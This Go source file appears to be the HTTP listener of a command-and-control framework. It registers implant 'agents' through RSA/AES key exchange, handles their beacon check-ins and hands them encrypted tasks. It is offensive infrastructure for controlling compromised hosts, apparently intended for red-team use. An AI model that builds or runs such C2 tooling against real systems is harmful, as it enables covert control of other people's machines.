package listeners

import (
	"crypto/rsa"
	"encoding/json"
	"fmt"
	"net/http"
	"sync"

	"sombra/cmd/crypto"
	"sombra/cmd/transport"
	"sombra/pkg/logger"

	"github.com/gin-gonic/gin"
)

type AgentKeys struct {
	UID   string
	Key   []byte
	Nonce []byte
}

type Registration struct {
	UID      string
	IP       string
	State    int
	Optional string
}

type Callback struct {
	AgentUID     string
	LastCallback int
}

type State struct {
	/*
		danger: the state is passed by reference to listeners, this is mutable
	*/
	Data Shared
	mu   sync.Mutex
}

type Gateway struct {
	Agent transport.Agent
	Task  transport.Task
}

type Shared struct {
	AgentKeys      []AgentKeys
	AgentList      []transport.Agent
	AgentTasks     []transport.Task
	AgentResults   []transport.Result
	AgentCallbacks []Callback
	Gateways       []Gateway
}

type Route struct {
	Method  string
	Path    string
	Handler gin.HandlerFunc
}

type RouteConfig struct {
	Routes []Route
}

var (
	KEX = 0x45
	AES = 0x60
	END = 0x90
)

func NewState() *State {
	return &State{
		Data: Shared{},
	}
}

func (s *State) VerifyAgent(uid string) bool {
	s.mu.Lock()
	defer s.mu.Unlock()

	for _, agent := range s.Data.AgentList {
		if agent.UID == uid {
			return true
		}
	}

	return false
}

func (s *State) DeleteAgent(uid string) {
	/*
		Assumes that the state is already locked, remember to lock before calling!
	*/
	for i, agent := range s.Data.AgentList {
		if agent.UID == uid {
			s.Data.AgentList = append(s.Data.AgentList[:i], s.Data.AgentList[i+1:]...)
			break
		}
	}
}

func (s *State) AddAgent(agent transport.Agent) error {
	s.mu.Lock()
	defer s.mu.Unlock()

	for _, a := range s.Data.AgentList {
		if a.UID == agent.UID {
			return fmt.Errorf("agent already exists")
		}
	}

	s.Data.AgentList = append(s.Data.AgentList, agent)
	return nil
}

func (s *State) CheckTasks(uid string) (transport.Agent, transport.Task) {
	/*
		we're assuming that this function is only ever called if the UID is valid.
	*/

	s.mu.Lock()
	defer s.mu.Unlock()

	var (
		agent transport.Agent
		task  transport.Task
	)

	for _, gateway := range s.Data.Gateways {
		if gateway.Agent.UID == uid {
			/*
				We're only interested in the FIRST task, subsequent tasks will not be fulfilled in parallel.
			*/
			agent = gateway.Agent
			task = gateway.Task
			break

		}
	}

	return agent, task
}

func (s *State) AddAgentKey(uid string, key []byte, nonce []byte) {
	s.mu.Lock()
	defer s.mu.Unlock()

	for _, agent := range s.Data.AgentKeys {
		if agent.UID == uid {
			/* if the agent already has a key, remove it */
			s.Data.AgentKeys = append(s.Data.AgentKeys[:0], s.Data.AgentKeys[1:]...)

			/* Since there's a new key, we also need to kill the old agent */
			s.DeleteAgent(uid)
			break
		}
	}

	s.Data.AgentKeys = append(s.Data.AgentKeys, AgentKeys{UID: uid, Key: key, Nonce: nonce})
}

func (s *State) FindAgentKey(uid string) (nonce []byte, key []byte) {
	s.mu.Lock()
	defer s.mu.Unlock()

	for _, agent := range s.Data.AgentKeys {
		if agent.UID == uid {
			return agent.Nonce, agent.Key
		}
	}

	return nil, nil
}

func Start(port string, sharedState *State, publicKey *rsa.PublicKey, privateKey *rsa.PrivateKey) error {
	r := gin.Default()

	r.GET("/tasks", func(c *gin.Context) {
		data := sharedState.Data
		c.JSON(http.StatusOK, gin.H{"test": data.Gateways})
	})

	r.POST("/changethis", func(c *gin.Context) {
		/*
			This is the main beacon routine for check-ins, the agent sends a raw HTTP POST with just their UID.
		*/

		data, err := c.GetRawData()
		if err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "invalid request"})
			return
		}

		uid := string(data)
		if !sharedState.VerifyAgent(uid) {
			c.JSON(http.StatusBadRequest, gin.H{"error": "invalid agent"})
			return
		}

		logger.Info(fmt.Sprintf("agent check-in: %s", uid))

		agent, task := sharedState.CheckTasks(uid)
		if agent.UID == "" || task.UID == "" {
			c.JSON(http.StatusOK, gin.H{"message": "no tasks"})
			return
		}

		nonce, key := sharedState.FindAgentKey(uid)
		if nonce == nil || key == nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to find agent key"})
			return
		}

		envelope := transport.Envelope{
			Agent: agent,
			Task:  task,
		}

		pkg, err := envelope.Package(key, nonce)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to package task"})
			return
		}

		c.JSON(http.StatusOK, gin.H{"task": pkg.Pkg})
	})

	r.POST("/register", func(c *gin.Context) {
		var reg Registration
		if err := c.BindJSON(&reg); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "invalid request"})
			return
		}

		switch reg.State {
		case KEX:
			/*
				1. Send our public key to the agent, we don't hardcode this to ensure that
				   agents are able to reconnect if the server restarts/crashes.

				@TODO: Change this to send a certificate instead to verify the server's identity.
					* not to be mistaken for HTTPS, we're not trusting TLS/SSL due to proxying.
			*/
			logger.Info(fmt.Sprintf("got initial check-in, beginning key exchange with agent: %s", reg.UID))
			logger.Debug(fmt.Sprintf("sending public key to agent: %s", reg.UID))

			publicKey, err := json.Marshal(publicKey)
			if err != nil {
				c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to marshal public key"})
				return
			}

			c.JSON(http.StatusOK, gin.H{"public_key": publicKey})
		case AES:
			/*
				2. Agent generates an AES GCM key & nonce, encrypts the key with the server's public key
				   then base64 encodes the encrypted key and sends it to the server.
			*/

			logger.Debug(fmt.Sprintf("unwrapping AES key from agent: %s", reg.UID))

			nonce, key, err := UnwrapKey(reg.Optional, privateKey)
			if err != nil {
				/*
					reg.Optional can actually error out if the agent sends an empty key, but this catches the
					errors thrown in UnwrapKey() and returns a generic error message.

					This may make implant dev a little bit cancerous, have fun debugging this.
				*/
				c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to unwrap key"})
				return
			}

			logger.Debug(fmt.Sprintf("AES key exchange successful with agent: %s", reg.UID))
			sharedState.AddAgentKey(reg.UID, key, nonce)

			c.JSON(http.StatusOK, gin.H{"message": "AES key exchange successful"})

		case END:
			/*
				3. Now, the agent has the server's public key, and the shared AES key is established.
				   We can now handle the registration of the agent.
			*/

			logger.Debug(fmt.Sprintf("registering agent: %s", reg.UID))
			uid := reg.UID
			agent_data, err := ParseAgent(uid, reg.Optional, sharedState)
			if err != nil {
				logger.Err(fmt.Sprintf("failed to parse agent data: %s", err))
				c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to parse agent data"})
				return
			}

			logger.Debug(fmt.Sprintf("agent registered: %s", reg.UID))
			err = sharedState.AddAgent(agent_data)
			if err != nil {
				c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to register agent"})
				return
			}

			c.JSON(http.StatusOK, gin.H{"message": "Registration complete"})

		}
	})

	go func() {
		logger.Info(fmt.Sprintf("starting HTTP listener on port %s", port))

		if err := r.Run(":" + port); err != nil {
			/*
				Theoretically, this should never error out; however, if it does, something likely went very wrong
			*/
			panic(err)
		}
	}()

	return nil
}

func UnwrapKey(enc_key string, privateKey *rsa.PrivateKey) (nonce []byte, key []byte, err error) {
	encrypted_key, err := crypto.Base64Decode(enc_key)
	if err != nil {
		return nil, nil, err
	}

	decrypted_key, err := crypto.DecryptRSA(privateKey, encrypted_key)
	if err != nil {
		return nil, nil, err
	}

	nonce, key, err = crypto.SplitSessionKey(decrypted_key)
	if err != nil {
		return nil, nil, err
	}

	return nonce, key, nil
}

func ParseAgent(uid string, enc_agent_data string, state *State) (transport.Agent, error) {
	nonce, sk := state.FindAgentKey(uid)
	if nonce == nil || sk == nil {
		return transport.Agent{}, fmt.Errorf("failed to find agent key")
	}

	encrypted_data, err := crypto.Base64Decode(enc_agent_data)
	if err != nil {
		return transport.Agent{}, err
	}

	decrypted_data, err := crypto.DecryptAES(sk, nonce, encrypted_data)
	if err != nil {
		return transport.Agent{}, err
	}

	var agent transport.Agent
	if err := json.Unmarshal(decrypted_data, &agent); err != nil {
		return transport.Agent{}, err
	}

	return agent, nil
}
